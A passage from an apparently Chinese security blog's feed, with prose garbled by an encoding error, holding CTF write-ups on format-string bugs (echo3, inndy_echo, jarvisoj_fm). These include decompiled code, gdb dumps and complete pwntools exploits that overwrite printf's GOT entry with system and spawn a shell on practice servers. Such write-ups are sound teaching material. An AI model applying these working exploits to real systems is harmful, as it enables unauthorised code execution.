çš„gotåœ°å€ä¸Šï¼Œå¼€å§‹å†™systemåœ°å€<br>ç”±äºè¿™ä¸ªæ¼æ´å¯ä»¥çš„ç”¨çš„æ¬¡æ•°æœ€å¤šæ˜¯4æ¬¡ï¼Œæ‰€ä»¥è¦å°½å¯èƒ½åˆ©ç”¨æ¯ä¸€æ¬¡ã€‚</li></ul><p>å¦‚ä¸Šå›¾æ‰€ç¤ºï¼Œå¾ˆç®€å•å°±å¯ä»¥æ³„æ¼å‡ºlibcåŸºå€ã€‚<br>ä½†æ˜¯æ¥ä¸‹æ¥æ€ä¹ˆæ„é€ printfçš„gotåœ°å€å’Œprintfçš„gotåœ°å€+2çš„åœ°å€å°±æœ‰ç‚¹éš¾äº†ã€‚</p><p>æ­¤æ—¶æ³¨æ„å›¾ä¸Šå‰ä¸¤ä¸ªçº¢æ¡†ï¼Œå¯ä»¥å‘ç°æŠŠå‰äºŒä¸ªçº¢æ¡†<strong>è™½ä¸æ˜¯ebp</strong>çš„é“¾ï¼Œä½†æ˜¯è¿™ä¹Ÿæ˜¯<strong>æˆä¸€ä¸ªé“¾</strong>å¯ä»¥åˆ©ç”¨äº†ã€‚ç„¶åå¯ä»¥æŠŠç¬¬äºŒä¸ªçº¢æ¡†çš„ä¸¤ä¸ªåœ°å€ä¿®æ”¹ä¸º ç¬¬ä¸€ä¸ªçº¢æ¡†çš„ä¸¤ä¸ªæ ˆæŒ‡é’ˆï¼š</p><p>è¿™é‡Œå¯ä»¥ç”¨gdbç›´æ¥æ¥æ‰‹åŠ¨è®¾ç½®ï¼Œè®©å’±ä»¬ä¸Šæ¥å°±å†™expè°ƒè¯•è¿˜æ˜¯æŒºè´¹åŠ²çš„ï¼š</p><div class="hljs"><pre><code class="hljs undefined">gdb-peda$ <span class="hljs-builtin-name">set</span> <span class="hljs-number">*0</span>xffbe5e6c = 0xffbe5d54gdb-peda$ <span class="hljs-builtin-name">set</span> <span class="hljs-number">*0</span>xffbe5e64 = 0xffbe5d60</code></pre></div><p><img src="http://qiqianyun.chumen77.xyz/uPic/KIrnCk.png" srcset="/img/loading.gif" alt></p><p>è¿™ä¸ªè¿‡ç¨‹ä¸­åœ¨æ³„æ¼ç›®æ ‡æ ˆåœ°å€ä»¥åï¼Œæ˜¯å¯ä»¥é€šè¿‡ä¸€æ¬¡printfå‡½æ•°å†™å…¥2æ¬¡åœ°å€ï¼Œå®ç°è¿™ä¸ªæ ˆæƒ…å†µçš„ã€‚</p><p>æ¥ç€å°±å¯ä»¥æ„é€ gotåœ°å€å’Œgot+2åœ°å€ï¼š</p><div class="hljs"><pre><code class="hljs undefined">gdb-peda$ <span class="hljs-builtin-name">set</span> <span class="hljs-number">*0</span>xffbe5d60  = 0x0804a016gdb-peda$ <span class="hljs-builtin-name">set</span> <span class="hljs-number">*0</span>xffbe5d54  = 0x0804a014</code></pre></div><p><img src="http://qiqianyun.chumen77.xyz/uPic/hma5RY.png" srcset="/img/loading.gif" alt></p><p>ç„¶åå°±å¯ä»¥åˆ©ç”¨å¯¹gotåœ°å€å’Œgot+2åœ°å€ä½¿ç”¨<code>%xhn</code>,å†™systemçš„å†…å­˜åœ°å€ä¸Šprintfçš„gotäº†ï¼š</p><div class="hljs"><pre><code class="hljs undefined"><span class="hljs-number">0120</span>| <span class="hljs-number">0xffbe5d88</span> --&gt; <span class="hljs-number">0xffbe5e6c</span> --&gt; <span class="hljs-number">0xffbe5d54</span> --&gt; <span class="hljs-number">0x804a014</span> --&gt; <span class="hljs-number">0xf7e0cda0</span> (&lt;__libc_system&gt;:<span class="hljs-keyword">sub</span>    <span class="hljs-built_in">esp</span>,<span class="hljs-number">0xc</span>)</code></pre></div><p>å†™å¥½ä»¥åï¼Œå†ä¼ è¿‡å»ä¸€ä¸‹<code>/bin/sh</code>å³å¯ã€‚</p><h4 id="exp-4"><a href="#exp-4" class="headerlink" title="exp"></a>exp</h4><div class="hljs"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *context.log_level = <span class="hljs-string">'debug'</span>context.arch =<span class="hljs-string">'i386'</span><span class="hljs-keyword">import</span> timeelf = ELF(<span class="hljs-string">'./echo3'</span>)debug = <span class="hljs-number">1</span><span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:    <span class="hljs-keyword">if</span> debug :        io = process(<span class="hljs-string">'./echo3'</span>)        libc = elf.libc    <span class="hljs-keyword">else</span>:        io = remote(<span class="hljs-string">'node3.buuoj.cn'</span>,<span class="hljs-number">25057</span>)        libc = ELF(<span class="hljs-string">'./libc-2.23.so.i386'</span>)    payload = <span class="hljs-string">'%43$pA%30$pA%47$p'</span>    io.sendline(payload)    address = io.recvline().strip()    <span class="hljs-keyword">if</span> address[<span class="hljs-number">-3</span>:] == <span class="hljs-string">'637'</span>:        <span class="hljs-keyword">if</span> address[<span class="hljs-number">7</span>:<span class="hljs-number">10</span>] == <span class="hljs-string">'637'</span>:            libc_base = int(address[<span class="hljs-number">2</span>:<span class="hljs-number">10</span>],<span class="hljs-number">16</span>) - <span class="hljs-number">247</span> - libc.symbols[<span class="hljs-string">'__libc_start_main'</span>]            tag1_stack_point = int(address[<span class="hljs-number">13</span>:<span class="hljs-number">21</span>],<span class="hljs-number">16</span>) - <span class="hljs-number">0x118</span>            tag2_stack_point = int(address[<span class="hljs-number">13</span>:<span class="hljs-number">21</span>],<span class="hljs-number">16</span>) - <span class="hljs-number">0x104</span> - <span class="hljs-number">0x8</span>            system_addr = libc_base + libc.symbols[<span class="hljs-string">'system'</span>]            print(<span class="hljs-string">'system_addr  -&gt;'</span> + hex(system_addr))            print(<span class="hljs-string">'tag1_stack_point -&gt;'</span> + hex(tag1_stack_point))            print(<span class="hljs-string">'tag2_stack_point -&gt;'</span> + hex(tag2_stack_point))            <span class="hljs-keyword">break</span>    <span class="hljs-keyword">else</span> :        io.close()        <span class="hljs-keyword">continue</span><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">fmtshort</span><span class="hljs-params">(prev,val,idx,byte = <span class="hljs-number">2</span>)</span>:</span>    result = <span class="hljs-string">""</span>    <span class="hljs-keyword">if</span> prev &lt; val :        result += <span class="hljs-string">"%"</span> + str(val - prev) + <span class="hljs-string">"c"</span>    <span class="hljs-keyword">elif</span> prev == val :        result += <span class="hljs-string">''</span>    <span class="hljs-keyword">else</span> :        result += <span class="hljs-string">"%"</span> + str(<span class="hljs-number">256</span>**byte - prev + val) + <span class="hljs-string">"c"</span>    result += <span class="hljs-string">"%"</span> + str(idx) + <span class="hljs-string">"$hn"</span>    <span class="hljs-keyword">return</span> result<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">fmtbyte</span><span class="hljs-params">(prev,val,idx,byte = <span class="hljs-number">1</span>)</span>:</span>    result = <span class="hljs-string">""</span>    <span class="hljs-keyword">if</span> prev &lt; val :        result += <span class="hljs-string">"%"</span> + str(val - prev) + <span class="hljs-string">"c"</span>    <span class="hljs-keyword">elif</span> prev == val :        result += <span class="hljs-string">''</span>    <span class="hljs-keyword">else</span> :        result += <span class="hljs-string">"%"</span> + str(<span class="hljs-number">256</span>**byte - prev + val) + <span class="hljs-string">"c"</span>    result += <span class="hljs-string">"%"</span> + str(idx) + <span class="hljs-string">"$hhn"</span>    <span class="hljs-keyword">return</span> resultprintf_got = <span class="hljs-number">0x0804a014</span>key1 = int(hex(tag1_stack_point)[<span class="hljs-number">-4</span>:],<span class="hljs-number">16</span>)key2 = int(hex(tag2_stack_point)[<span class="hljs-number">-4</span>:],<span class="hljs-number">16</span>)info(<span class="hljs-string">'--------change the two points to tag_stack_point:-------'</span>)<span class="hljs-comment"># raw_input('-&gt;')</span>prev = <span class="hljs-number">0</span>payload = <span class="hljs-string">""</span><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> range(<span class="hljs-number">1</span>):    payload +=fmtshort(prev,(key1 &gt;&gt; <span class="hljs-number">16</span>*i) &amp; <span class="hljs-number">0xffff</span>,<span class="hljs-number">30</span>+i)     prev = (key1 &gt;&gt; i*<span class="hljs-number">16</span>) &amp; <span class="hljs-number">0xffff</span><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> range(<span class="hljs-number">1</span>):    payload +=fmtshort(prev,(key2 &gt;&gt; <span class="hljs-number">16</span>*i) &amp; <span class="hljs-number">0xffff</span>,<span class="hljs-number">31</span>+i)     prev = (key2 &gt;&gt; i*<span class="hljs-number">16</span>) &amp; <span class="hljs-number">0xffff</span>payload = payload + <span class="hljs-string">'1111'</span>io.sendline(payload)io.recvuntil(<span class="hljs-string">'1111'</span>)info(<span class="hljs-string">'--------change got_table to printf_got:-------'</span>)prev = <span class="hljs-number">0</span> payload = <span class="hljs-string">""</span>key3 = <span class="hljs-number">0x14</span>key4 = <span class="hljs-number">0x16</span><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> range(<span class="hljs-number">1</span>):    payload +=fmtbyte(prev,(key3 &gt;&gt; <span class="hljs-number">8</span>*i) &amp; <span class="hljs-number">0xff</span>,<span class="hljs-number">87</span>+i)     prev = (key3 &gt;&gt; i*<span class="hljs-number">8</span>) &amp; <span class="hljs-number">0xff</span><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> range(<span class="hljs-number">1</span>):    payload +=fmtbyte(prev,(key4 &gt;&gt; <span class="hljs-number">8</span>*i) &amp; <span class="hljs-number">0xff</span>,<span class="hljs-number">85</span>+i)     prev = (key4 &gt;&gt; i*<span class="hljs-number">8</span>) &amp; <span class="hljs-number">0xff</span>payload = payload + <span class="hljs-string">'2222'</span>io.sendline(payload)io.recvuntil(<span class="hljs-string">'2222'</span>)info(<span class="hljs-string">'--------change printf_got to system_addr:-------'</span>)raw_input(<span class="hljs-string">'-&gt;'</span>)prev = <span class="hljs-number">0</span> payload = <span class="hljs-string">""</span>key5 = int(hex(system_addr)[<span class="hljs-number">-4</span>:],<span class="hljs-number">16</span>)key6 = int(hex(system_addr)[<span class="hljs-number">2</span>:<span class="hljs-number">6</span>],<span class="hljs-number">16</span>)print(<span class="hljs-string">'key5 -&gt; '</span> + hex(key5))print(<span class="hljs-string">'key6 -&gt; '</span> + hex(key6))<span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> range(<span class="hljs-number">1</span>):    payload +=fmtshort(prev,(key5 &gt;&gt; <span class="hljs-number">16</span>*i) &amp; <span class="hljs-number">0xffff</span>,<span class="hljs-number">17</span>+i)     prev = (key5 &gt;&gt; i*<span class="hljs-number">16</span>) &amp; <span class="hljs-number">0xffff</span><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> range(<span class="hljs-number">1</span>):    payload +=fmtshort(prev,(key6 &gt;&gt; <span class="hljs-number">16</span>*i) &amp; <span class="hljs-number">0xffff</span>,<span class="hljs-number">20</span>+i)     prev = (key6 &gt;&gt; i*<span class="hljs-number">16</span>) &amp; <span class="hljs-number">0xffff</span>payload = payload + <span class="hljs-string">'3333'</span>io.sendline(payload)sleep(<span class="hljs-number">1</span>)io.recvuntil(<span class="hljs-string">'3333'</span>)raw_input(<span class="hljs-string">'&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;'</span>)io.sendline(<span class="hljs-string">'/bin/sh\x00\x00\x00\x00\x00\x00'</span>)io.interactive()</code></pre></div><p>è¿™ä¸ªexpçš„éš¾ç‚¹åœ¨äºï¼š</p><ul><li>æ³¨æ„å»å®šä½åˆ°åˆé€‚çš„æ ˆç»“æ„å†å»åˆ©ç”¨</li><li>å°½é‡å……åˆ†åˆ©ç”¨æ¯ä¸€æ¬¡çš„printf</li><li>å•æ¬¡printfå¤šæ¬¡å†™å…¥</li><li>æ³¨æ„æ¯æ¬¡ä¼ æ•°æ®è¿‡å»åï¼Œä¸€å®šè¦æ¥æ”¶ä¸€ä¸‹ï¼Œå¹¶ä¸”å†ä¸€æ¬¡çš„æ•°æ®è¯»å…¥è¦é˜²æ­¢bssä¸Šçš„ç¼“å†²åŒºé‡Œé¢å‚æ‚æ•°æ®çš„å½±å“ã€‚</li></ul><h3 id="å°æ€»ç»“"><a href="#å°æ€»ç»“" class="headerlink" title="å°æ€»ç»“"></a>å°æ€»ç»“</h3><p>é€šè¿‡è¿™ä¸¤ä¸ªä¾‹é¢˜è¯´æ˜ï¼Œé¢å¯¹fmtçš„bufä¸åœ¨æ ˆä¸Šæ—¶ï¼Œå½’æ ¹ç»“åº•ä¹Ÿå°±æ˜¯ä¸€å®šè¦å­¦ä¼š<strong>çµæ´»ã€å……åˆ†çš„åˆ©ç”¨æ ˆä¸Šçš„æ•°æ®</strong>,å•çº¯çš„ebpé“¾åªæ˜¯é€‚åˆç®€å•çš„æƒ…å†µã€‚</p><p>ä½†æ˜¯ä¹Ÿæ˜¯åšé¢˜æ—¶ï¼Œä¹Ÿæ˜¯ä¸€å®šè¦ä¼˜å…ˆè€ƒè™‘ebpé“¾æ˜¯å¦èƒ½åˆ©ç”¨ï¼Œå› ä¸ºebpé“¾æ„æˆçš„è¯ï¼Œå®ƒçš„ç›¸å¯¹åç§»å°±æ˜¯<strong>é’ˆå¯¹æ€§ç¨‹åºæœ¬èº«çš„</strong>ï¼ŒåŸºæœ¬ä¸ä¼šå—åˆ°libcç‰ˆæœ¬çš„å½±å“ï¼Œç”¨èµ·æ¥å¾ˆå¥½ç”¨ï¼Œè¦ä¼˜å…ˆè€ƒè™‘ã€‚</p><p>è¿˜æœ‰å°±æ˜¯é¢å¯¹è¿™ç§ä¼š<strong>æœ‰éšæœºæ ˆæƒ…å†µã€æ²¡æœ‰ebpé“¾</strong>çš„é¢˜ç›®ï¼Œä¸€å®šè¦æ³¨æ„æœ¬åœ°å’Œè¿œç¨‹çš„libcç‰ˆæœ¬ã€æ³¨æ„ç¯å¢ƒ,å› ä¸ºè¿™äº›ä¸ä¸€æ ·å¯¼è‡´æ ˆçš„æƒ…å†µä¹Ÿæ˜¯ä¸ä¸€æ ·çš„ï¼Œå¯¼è‡´expä¹Ÿè¦æœ‰ç›¸åº”çš„å˜åŒ–ã€‚</p>]]></content>
    
    
    
    <tags>
      
      <tag>pwn</tag>
      
      <tag>å­¦ä¹ è®°å½•</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>æ ¼å¼åŒ–å­—ç¬¦ä¸²æ¼æ´é¢˜ç›®ç»ƒä¹ </title>
    <link href="/2020/03/15/%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E6%BC%8F%E6%B4%9E%E9%A2%98%E7%9B%AE%E7%BB%83%E4%B9%A0/"/>
    <url>/2020/03/15/%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E6%BC%8F%E6%B4%9E%E9%A2%98%E7%9B%AE%E7%BB%83%E4%B9%A0/</url>
    
    <content type="html"><![CDATA[<h1 id="æ ¼å¼åŒ–å­—ç¬¦ä¸²æ¼æ´é¢˜ç›®ç»ƒä¹ "><a href="#æ ¼å¼åŒ–å­—ç¬¦ä¸²æ¼æ´é¢˜ç›®ç»ƒä¹ " class="headerlink" title="æ ¼å¼åŒ–å­—ç¬¦ä¸²æ¼æ´é¢˜ç›®ç»ƒä¹ "></a>æ ¼å¼åŒ–å­—ç¬¦ä¸²æ¼æ´é¢˜ç›®ç»ƒä¹ </h1><h2 id="å‰è¨€"><a href="#å‰è¨€" class="headerlink" title="å‰è¨€"></a>å‰è¨€</h2><p>æ•´åˆä¸€ä¸‹æœ€è¿‘åšçš„æ ¼å¼åŒ–å­—ç¬¦ä¸²é¢˜ç›®çš„ç»ƒä¹ ï¼ŒæŠŠwpç»™å†™ä¸€ä¸‹ï¼Œæ–¹ä¾¿å¯¹æ€»ç»“å¯¹è¿™ä¸ªæ¼æ´çš„åˆ©ç”¨å¥—è·¯å’ŒæŠ€å·§ã€‚</p><h2 id="inndy-echo"><a href="#inndy-echo" class="headerlink" title="inndy_echo"></a>inndy_echo</h2><h3 id="ä¿æŠ¤å’Œarch"><a href="#ä¿æŠ¤å’Œarch" class="headerlink" title="ä¿æŠ¤å’Œarch"></a>ä¿æŠ¤å’Œarch</h3><div class="hljs"><pre><code class="hljs undefined"><span class="hljs-string">[*]</span> <span class="hljs-string">'/media/psf/mypwn2/buuctf/inndy_echo/echo'</span><span class="hljs-attr">    Arch:</span>     <span class="hljs-string">i386-32-little</span><span class="hljs-attr">    RELRO:</span>    <span class="hljs-string">Partial</span> <span class="hljs-string">RELRO</span><span class="hljs-attr">    Stack:</span>    <span class="hljs-literal">No</span> <span class="hljs-string">canary</span> <span class="hljs-string">found</span><span class="hljs-attr">    NX:</span>       <span class="hljs-string">NX</span> <span class="hljs-string">enabled</span><span class="hljs-attr">    PIE:</span>      <span class="hljs-literal">No</span> <span class="hljs-string">PIE</span> <span class="hljs-string">(0x8048000)</span></code></pre></div><h3 id="idaåˆ†æ"><a href="#idaåˆ†æ" class="headerlink" title="idaåˆ†æ"></a>idaåˆ†æ</h3><div class="hljs"><pre><code class="hljs c"><span class="hljs-keyword">int</span> __cdecl __<span class="hljs-function">noreturn <span class="hljs-title">main</span><span class="hljs-params">(<span class="hljs-keyword">int</span> argc, <span class="hljs-keyword">const</span> <span class="hljs-keyword">char</span> **argv, <span class="hljs-keyword">const</span> <span class="hljs-keyword">char</span> **envp)</span></span>&#123;  <span class="hljs-keyword">char</span> s; <span class="hljs-comment">// [esp+Ch] [ebp-10Ch]</span>  <span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">int</span> v4; <span class="hljs-comment">// [esp+10Ch] [ebp-Ch]</span>  v4 = __readgsdword(<span class="hljs-number">0x14</span>u);  setvbuf(<span class="hljs-built_in">stdin</span>, <span class="hljs-number">0</span>, <span class="hljs-number">2</span>, <span class="hljs-number">0</span>);  setvbuf(<span class="hljs-built_in">stdout</span>, <span class="hljs-number">0</span>, <span class="hljs-number">2</span>, <span class="hljs-number">0</span>);  <span class="hljs-keyword">do</span>  &#123;    fgets(&amp;s, <span class="hljs-number">256</span>, <span class="hljs-built_in">stdin</span>);    <span class="hljs-built_in">printf</span>(&amp;s);  &#125;  <span class="hljs-keyword">while</span> ( <span class="hljs-built_in">strcmp</span>(&amp;s, <span class="hljs-string">"exit\n"</span>) );  system(<span class="hljs-string">"echo Goodbye"</span>);  <span class="hljs-built_in">exit</span>(<span class="hljs-number">0</span>);&#125;</code></pre></div><p>å¯ä»¥çœ‹åˆ°ä¼šæ— é™çš„æ‰“å°ä½ è¾“å…¥çš„ä¸œè¥¿ï¼Œå¹¶ä¸”æœ‰systemè¿™ä¸ªå‡½æ•°ï¼Œåˆ©ç”¨æ€è·¯ä¹Ÿå°±æ˜¯GOT hijackï¼ŒæŠŠprintfå‡½æ•°çš„gotæ”¹ä¸ºsystemçš„pltï¼Œæ³¨æ„è¦å•æ¬¡printfå¤šæ¬¡å†™å…¥ï¼Œæ”¹ä¸ºsystemçš„pltåï¼Œå†ä¼ è¿‡å»<code>/bin/sh</code>ï¼Œæ­¤æ—¶å°±ä¼šå˜æˆ<code>system(/bin/sh)</code></p><h3 id="gdbè°ƒè¯•"><a href="#gdbè°ƒè¯•" class="headerlink" title="gdbè°ƒè¯•"></a>gdbè°ƒè¯•</h3><div class="hljs"><pre><code class="hljs undefined">gdb-peda$ stack <span class="hljs-number">0x20</span><span class="hljs-number">0000</span>| <span class="hljs-number">0xffffd250</span> --&gt; <span class="hljs-number">0xffffd26c</span> (<span class="hljs-string">"AAAA<span class="hljs-subst">\n</span>"</span>)<span class="hljs-number">0004</span>| <span class="hljs-number">0xffffd254</span> --&gt; <span class="hljs-number">0x100</span><span class="hljs-number">0008</span>| <span class="hljs-number">0xffffd258</span> --&gt; <span class="hljs-number">0xf7fb25a0</span> --&gt; <span class="hljs-number">0xfbad208b</span><span class="hljs-number">0012</span>| <span class="hljs-number">0xffffd25c</span> --&gt; <span class="hljs-number">0x0</span><span class="hljs-number">0016</span>| <span class="hljs-number">0xffffd260</span> --&gt; <span class="hljs-number">0xf7ffd000</span> --&gt; <span class="hljs-number">0x23f40</span><span class="hljs-number">0020</span>| <span class="hljs-number">0xffffd264</span> --&gt; <span class="hljs-number">0x80482e7</span> (<span class="hljs-string">"__libc_start_main"</span>)<span class="hljs-number">0024</span>| <span class="hljs-number">0xffffd268</span> --&gt; <span class="hljs-number">0xf63d4e2e</span><span class="hljs-number">0028</span>| <span class="hljs-number">0xffffd26c</span> (<span class="hljs-string">"AAAA<span class="hljs-subst">\n</span>"</span>)</code></pre></div><div class="hljs"><pre><code class="hljs c">gdb-peda$ fmtarg <span class="hljs-number">0xffffd26c</span>The index of format argument : <span class="hljs-number">7</span> (<span class="hljs-string">"\%6$p"</span>)</code></pre></div><p>ç¡®å®šåç§»æ˜¯7ï¼Œæ‰“ç®—ä¸€ä¼šå†™payloadæ—¶å€™éœ€è¦è¡¥é½ï¼Œå°±<code>.ljust</code>è¡¥æˆ0x20çš„ï¼Œä¹Ÿå°±æ˜¯<code>offset = 7 + 0x20/4 = 15</code></p><h3 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h3><div class="hljs"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *context.log_level = <span class="hljs-string">'debug'</span>context.arch = <span class="hljs-string">'i386'</span><span class="hljs-comment"># io = process('./echo')</span>io = remote(<span class="hljs-string">'node3.buuoj.cn'</span>,<span class="hljs-number">26990</span>)system_plt = <span class="hljs-number">0x08048400</span>printf_got = <span class="hljs-number">0x0804A010</span><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">fmt_short</span><span class="hljs-params">(prev,val,idx,byte = <span class="hljs-number">2</span>)</span>:</span>    result = <span class="hljs-string">""</span>    <span class="hljs-keyword">if</span> prev &lt; val :        result += <span class="hljs-string">"%"</span> + str(val - prev) + <span class="hljs-string">"c"</span>    <span class="hljs-keyword">elif</span> prev == val :        result += <span class="hljs-string">''</span>    <span class="hljs-keyword">else</span> :        result += <span class="hljs-string">"%"</span> + str(<span class="hljs-number">256</span>**byte - prev + val) + <span class="hljs-string">"c"</span>    result += <span class="hljs-string">"%"</span> + str(idx) + <span class="hljs-string">"$hn"</span>    <span class="hljs-keyword">return</span> resultprev = <span class="hljs-number">0</span> payload = <span class="hljs-string">""</span>key = <span class="hljs-number">0x08048400</span><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> range(<span class="hljs-number">2</span>):    payload +=fmt_short(prev,(key &gt;&gt; <span class="hljs-number">16</span>*i) &amp; <span class="hljs-number">0xffff</span>,<span class="hljs-number">15</span>+i)     prev = (key &gt;&gt; i*<span class="hljs-number">16</span>) &amp; <span class="hljs-number">0xffff</span>payload = payload.ljust(<span class="hljs-number">0x20</span>,<span class="hljs-string">'a'</span>) + p32(printf_got) + p32(printf_got+<span class="hljs-number">2</span>)raw_input(<span class="hljs-string">'-&gt;'</span>)io.sendline(payload)io.send(<span class="hljs-string">'/bin/sh\x00'</span>)io.interactive()</code></pre></div><p>æ¢ä¸€ç§å°±æ˜¯ç”¨pwntoolsæ¨¡å—ï¼Œé¢å¯¹32ä½ï¼Œè¿™ç§æƒ…å†µè¿˜æ˜¯å¾ˆå¥½ç”¨çš„ï¼š</p><div class="hljs"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *context.log_level = <span class="hljs-string">'debug'</span>context.arch = <span class="hljs-string">'i386'</span><span class="hljs-comment"># io = process('./echo')</span>io = remote(<span class="hljs-string">'node3.buuoj.cn'</span>,<span class="hljs-number">26990</span>)system_plt = <span class="hljs-number">0x08048400</span>printf_got = <span class="hljs-number">0x0804A010</span>payload = fmtstr_payload(<span class="hljs-number">7</span>,&#123;printf_got : system_plt&#125;)io.sendline(payload)io.send(<span class="hljs-string">'/bin/sh\x00'</span>)io.interactive()</code></pre></div><div class="hljs"><pre><code class="hljs c">[DEBUG] Sent <span class="hljs-number">0x3c</span> bytes:    <span class="hljs-number">00000000</span>  <span class="hljs-number">10</span> a0 <span class="hljs-number">04</span> <span class="hljs-number">08</span>  <span class="hljs-number">11</span> a0 <span class="hljs-number">04</span> <span class="hljs-number">08</span>  <span class="hljs-number">12</span> a0 <span class="hljs-number">04</span> <span class="hljs-number">08</span>  <span class="hljs-number">13</span> a0 <span class="hljs-number">04</span> <span class="hljs-number">08</span>  â”‚Â·Â·Â·Â·â”‚Â·Â·Â·Â·â”‚Â·Â·Â·Â·â”‚Â·Â·Â·Â·â”‚    <span class="hljs-number">00000010</span>  <span class="hljs-number">25</span> <span class="hljs-number">32</span> <span class="hljs-number">34</span> <span class="hljs-number">30</span>  <span class="hljs-number">63</span> <span class="hljs-number">25</span> <span class="hljs-number">37</span> <span class="hljs-number">24</span>  <span class="hljs-number">68</span> <span class="hljs-number">68</span> <span class="hljs-number">6</span>e <span class="hljs-number">25</span>  <span class="hljs-number">31</span> <span class="hljs-number">33</span> <span class="hljs-number">32</span> <span class="hljs-number">63</span>  â”‚%<span class="hljs-number">240</span>â”‚c%<span class="hljs-number">7</span>$â”‚hhn%â”‚<span class="hljs-number">132</span>câ”‚    <span class="hljs-number">00000020</span>  <span class="hljs-number">25</span> <span class="hljs-number">38</span> <span class="hljs-number">24</span> <span class="hljs-number">68</span>  <span class="hljs-number">68</span> <span class="hljs-number">6</span>e <span class="hljs-number">25</span> <span class="hljs-number">31</span>  <span class="hljs-number">32</span> <span class="hljs-number">38</span> <span class="hljs-number">63</span> <span class="hljs-number">25</span>  <span class="hljs-number">39</span> <span class="hljs-number">24</span> <span class="hljs-number">68</span> <span class="hljs-number">68</span>  â”‚%<span class="hljs-number">8</span>$hâ”‚hn%<span class="hljs-number">1</span>â”‚<span class="hljs-number">28</span>c%â”‚<span class="hljs-number">9</span>$hhâ”‚    <span class="hljs-number">00000030</span>  <span class="hljs-number">6</span>e <span class="hljs-number">25</span> <span class="hljs-number">34</span> <span class="hljs-number">63</span>  <span class="hljs-number">25</span> <span class="hljs-number">31</span> <span class="hljs-number">30</span> <span class="hljs-number">24</span>  <span class="hljs-number">68</span> <span class="hljs-number">68</span> <span class="hljs-number">6</span>e <span class="hljs-number">0</span>a               â”‚n%<span class="hljs-number">4</span>câ”‚%<span class="hljs-number">10</span>$â”‚hhnÂ·â”‚â”‚    <span class="hljs-number">0000003</span>c</code></pre></div><p>å¯ä»¥çœ‹ä¸€ä¸‹å…¶ç”Ÿæˆçš„payloadï¼ŒæŠŠç›®æ ‡åœ°å€ä¿¡æ¯æ”¾åœ¨å¼€å¤´ï¼Œåœ¨64ä½æ˜¯è‚¯å®šæ˜¯ä¸å¯è¡Œçš„ã€‚</p><h2 id="jarvisoj-fm"><a href="#jarvisoj-fm" class="headerlink" title="jarvisoj_fm"></a>jarvisoj_fm</h2><h3 id="idaåˆ†æ-1"><a href="#idaåˆ†æ-1" class="headerlink" title="idaåˆ†æ"></a>idaåˆ†æ</h3><div class="hljs"><pre><code class="hljs c"><span class="hljs-keyword">int</span> __<span class="hljs-function">cdecl <span class="hljs-title">main</span><span class="hljs-params">(<span class="hljs-keyword">int</span> argc, <span class="hljs-keyword">const</span> <span class="hljs-keyword">char</span> **argv, <span class="hljs-keyword">const</span> <span class="hljs-keyword">char</span> **envp)</span></span>&#123;  <span class="hljs-keyword">char</span> buf; <span class="hljs-comment">// [esp+2Ch] [ebp-5Ch]</span>  <span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">int</span> v5; <span class="hljs-comment">// [esp+7Ch] [ebp-Ch]</span>  v5 = __readgsdword(<span class="hljs-number">0x14</span>u);  be_nice_to_people();  <span class="hljs-built_in">memset</span>(&amp;buf, <span class="hljs-number">0</span>, <span class="hljs-number">0x50</span>u);  read(<span class="hljs-number">0</span>, &amp;buf, <span class="hljs-number">0x50</span>u);  <span class="hljs-built_in">printf</span>(&amp;buf);  <span class="hljs-built_in">printf</span>(<span class="hljs-string">"%d!\n"</span>, *(_DWORD *)&amp;x);  <span class="hljs-keyword">if</span> ( *(_DWORD *)&amp;x != <span class="hljs-number">4</span> )    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;  <span class="hljs-built_in">puts</span>(<span class="hljs-string">"running sh..."</span>);  system(<span class="hljs-string">"/bin/sh"</span>);  <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;&#125;</code></pre></div><p>ååˆ†ç®€å•çš„é¢˜ç›®ï¼Œæ£€éªŒ x å€¼æ˜¯å¦ä¸º4ï¼Œå¦‚æœæ˜¯4ï¼ˆæ•°å­—ï¼‰ï¼Œå°±ç›´æ¥ç»™ä½ shelläº†ã€‚</p><h3 id="exp-1"><a href="#exp-1" class="headerlink" title="exp"></a>exp</h3><div class="hljs"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *context.log_level = <span class="hljs-string">'debug'</span><span class="hljs-comment"># io = process('./fm')</span>io = remote(<span class="hljs-string">'node3.buuoj.cn'</span>,<span class="hljs-number">26915</span>)<span class="hljs-comment"># io.recv()</span>payload = p32(<span class="hljs-number">0x0804A02C</span>) + <span class="hljs-string">'%11$hn'</span>raw_input(<span class="hljs-string">'-&gt;'</span>)io.sendline(payload)io.interactive()</code></pre></div><h2 id="winesap-week6"><a href="#winesap-week6" class="headerlink" title="winesap_week6"></a>winesap_week6</h2><h3 id="æºç ï¼š"><a href="#æºç ï¼š" class="headerlink" title="æºç ï¼š"></a>æºç ï¼š</h3><div class="hljs"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;stdio.h&gt;</span></span><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span><span 